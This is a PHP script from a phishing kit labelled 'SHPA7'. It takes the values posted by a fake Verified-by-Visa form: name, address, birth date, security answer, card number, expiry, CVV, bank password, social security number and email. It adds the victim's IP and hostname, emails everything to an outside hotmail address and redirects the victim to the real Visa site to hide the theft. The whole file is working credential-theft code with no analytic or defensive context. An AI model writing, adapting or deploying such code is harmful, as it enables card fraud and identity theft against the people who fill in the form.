<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$bilsmg .= "======================= SHPA7 =====================\n";
$bilsmg .= "Full name   : ".$_POST['prenom']."\n";
$bilsmg .= "Adress line : ".$_POST['adresse']."\n";
$bilsmg .= "City  : ".$_POST['ville']."\n";
$bilsmg .= "Province : ".$_POST['province']."\n";
$bilsmg .= "Zip code  : ".$_POST['code_postal']."\n";
$bilsmg .= "Date of birth : ".$_POST['00']."/".$_POST['11']."/".$_POST['33']."\n";
$bilsmg .= "Phone number  : ".$_POST['phone']."\n";
$bilsmg .= "Personal question : ".$_POST['pq']."\n";
$bilsmg .= "Personal response   : ".$_POST['pr']."\n";
$bilsmg .= "Card type : ".$_POST['ct']."\n";
$bilsmg .= "Credit card number   : ".$_POST['cart']."\n";
$bilsmg .= "Expiration date : ".$_POST['day']."/".$_POST['day1']."\n";
$bilsmg .= "Cvv  : ".$_POST['cvv']."\n";
$bilsmg .= "Bank name : ".$_POST['bn']."\n";
$bilsmg .= "Bank password   : ".$_POST['bp']."\n";
$bilsmg .= "Social security number : ".$_POST['ssn']."\n";
$bilsmg .= "VBV password  : ".$_POST['password']."\n";
$bilsmg .= "Email: ".$_POST['sce']."\n";
$bilsmg .= "======================= SHPA7 =====================\n";
$bilsmg .= "CLIENT IP               : ".$ip."\n";
$bilsmg .= "HOSTNAME                : ".$hostname."\n";
$bilsmg .= "DATE & TIME		     : ".$date." --> ".$time."\n";

$bilsmg .= "======================= SHPA7 =====================\n";

$bilsnd = "cca@hotmail.com";
$bilsub = "VBV result $ip";
$bilhead = "cca@hotmail.com";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);
header("Location:  http://usa.visa.com");
?>